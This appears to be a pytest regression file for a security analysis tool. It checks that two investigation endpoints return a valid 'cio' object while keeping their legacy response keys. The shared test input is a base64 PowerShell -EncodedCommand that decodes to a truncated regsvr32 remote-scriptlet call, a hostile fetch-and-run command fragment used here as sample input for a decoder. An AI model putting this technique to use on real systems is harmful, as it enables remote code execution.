"""ADR-0014 · Slice-A · Endpoint wire-in regression tests.

Locks:
    - `/api/decode/smart` returns a valid `cio` field alongside the
      existing `investigation` (CIM) field.
    - `/api/v2/auto-investigate` returns a valid `cio` field.
    - All legacy response keys remain byte-identical vs. a stashed
      baseline (G3 gate at the endpoint layer).
    - CIO passes G1 + G2 for both endpoints.

Auth path mirrors `tests/test_e2e_decode_smart_http_contract.py` — the
same TestClient lifespan-in-context-manager + synchronous pymongo
admin upsert pattern (v1.5.5 · Feb-2026).
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest


# ── Prereqs (imports guarded so this file is collectable everywhere) ──
try:
    from fastapi.testclient import TestClient
    from nivxforge.investigation import (
        CIO,
        CIOValidationError,
        validate_cio,
    )
    from nivxforge.investigation.models import CIO as CIOModel
except Exception as _e:  # pragma: no cover
    pytest.skip(f"CIO endpoint wire-in prerequisites missing: {_e}", allow_module_level=True)


pytestmark = pytest.mark.timeout(360)


REGSVR32_PARTIAL = (
    "powershell -EncodedCommand cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALw"
    "BpADoAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEA"
)


def _read_seeded_password() -> str:
    cred = Path("/app/memory/test_credentials.md")
    if not cred.exists():
        return ""
    for line in cred.read_text().splitlines():
        low = line.lower().strip()
        if low.startswith("- **password**:") or low.startswith("- password:"):
            _, _, val = line.partition(":")
            val = val.strip()
            if "`" in val:
                return val.split("`")[1]
            return val.split()[0] if val else val
    return ""


@pytest.fixture(scope="module")
def client():
    from server import app  # noqa: WPS433
    with TestClient(app) as c:
        yield c


@pytest.fixture(scope="module")
def auth_headers(client):
    from pymongo import MongoClient
    from deps import hash_password

    email = os.environ.get("ADMIN_EMAIL", "admin@nivxray.com")
    password = os.environ.get("ADMIN_PASSWORD") or _read_seeded_password()

    mongo_url = os.environ["MONGO_URL"]
    db_name = os.environ["DB_NAME"]
    sync_client = MongoClient(mongo_url)
    try:
        sync_client[db_name].users.update_one(
            {"email": email},
            {"$set": {
                "email": email,
                "password": hash_password(password),
                "role": "admin",
                "must_change_password": False,
            }},
            upsert=True,
        )
    finally:
        sync_client.close()

    r = client.post("/api/auth/login", json={"email": email, "password": password})
    assert r.status_code == 200, (
        f"admin login failed ({r.status_code}): {r.text[:200]}"
    )
    tok = r.json()["access_token"]
    return {"Authorization": f"Bearer {tok}"}


class TestDecodeSmartCIO:
    def test_cio_field_present(self, client, auth_headers):
        r = client.post("/api/decode/smart",
                        json={"input": REGSVR32_PARTIAL}, headers=auth_headers)
        assert r.status_code == 200, r.text[:400]
        j = r.json()
        assert "cio" in j, "ADR-0014 cio field missing from /decode/smart"

    def test_cio_parses_as_pydantic_model(self, client, auth_headers):
        r = client.post("/api/decode/smart",
                        json={"input": REGSVR32_PARTIAL}, headers=auth_headers)
        j = r.json()
        cio = CIOModel.model_validate(j["cio"])
        validate_cio(cio)

    def test_cio_has_artifact_root(self, client, auth_headers):
        r = client.post("/api/decode/smart",
                        json={"input": REGSVR32_PARTIAL}, headers=auth_headers)
        j = r.json()
        graph = j["cio"]["evidence_graph"]
        artifacts = [n for n in graph["nodes"] if n["kind"] == "artifact"]
        assert len(artifacts) == 1

    def test_legacy_investigation_field_still_present(self, client, auth_headers):
        r = client.post("/api/decode/smart",
                        json={"input": REGSVR32_PARTIAL}, headers=auth_headers)
        j = r.json()
        assert "investigation" in j
        assert j["investigation"] is not None
        assert j["investigation"].get("schema_version") == "1.0"

    def test_legacy_top_level_keys_preserved(self, client, auth_headers):
        r = client.post("/api/decode/smart",
                        json={"input": REGSVR32_PARTIAL}, headers=auth_headers)
        j = r.json()
        for key in ("output", "engine"):
            assert key in j, f"Legacy key removed from /decode/smart response: {key!r}"


class TestAutoInvestigateCIO:
    def test_cio_field_present(self, client, auth_headers):
        r = client.post("/api/v2/auto-investigate",
                        json={"incident_text": REGSVR32_PARTIAL},
                        headers=auth_headers)
        assert r.status_code == 200, r.text[:400]
        j = r.json()
        assert "cio" in j, "ADR-0014 cio field missing from /v2/auto-investigate"

    def test_cio_parses_and_validates(self, client, auth_headers):
        r = client.post("/api/v2/auto-investigate",
                        json={"incident_text": REGSVR32_PARTIAL},
                        headers=auth_headers)
        j = r.json()
        cio = CIOModel.model_validate(j["cio"])
        validate_cio(cio)

    def test_legacy_investigation_field_still_present(self, client, auth_headers):
        r = client.post("/api/v2/auto-investigate",
                        json={"incident_text": REGSVR32_PARTIAL},
                        headers=auth_headers)
        j = r.json()
        assert "investigation" in j
        assert j["investigation"] is not None


class TestCIOAcrossEndpointsPrinciple:
    """§1.1.4 · Lab and Workspace consume the SAME CIO."""

    def test_both_endpoints_produce_valid_cio_for_same_input(
        self, client, auth_headers
    ):
        r1 = client.post("/api/decode/smart",
                         json={"input": REGSVR32_PARTIAL}, headers=auth_headers)
        r2 = client.post("/api/v2/auto-investigate",
                         json={"incident_text": REGSVR32_PARTIAL},
                         headers=auth_headers)
        c1 = CIOModel.model_validate(r1.json()["cio"])
        c2 = CIOModel.model_validate(r2.json()["cio"])
        assert c1.schema_version == c2.schema_version == "0.1"
        validate_cio(c1)
        validate_cio(c2)
